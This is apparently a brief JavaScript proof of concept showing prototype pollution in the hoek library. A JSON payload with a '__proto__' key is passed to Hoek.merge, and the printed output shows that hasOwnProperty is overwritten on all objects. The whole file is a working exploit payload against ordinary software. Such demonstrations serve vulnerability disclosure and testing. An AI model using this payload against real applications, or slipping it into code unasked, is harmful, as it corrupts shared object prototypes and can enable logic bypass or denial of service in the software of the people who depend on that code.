var Hoek = require('hoek');
var malicious_payload = '{"__proto__": {"hasOwnProperty": true}}';

var a = {
    a: 1,
};

console.log("Before : " + a.hasOwnProperty);  // function hasOwnProperty() { [native code] }
Hoek.merge({}, JSON.parse(malicious_payload));
console.log("After : " + a.hasOwnProperty); // true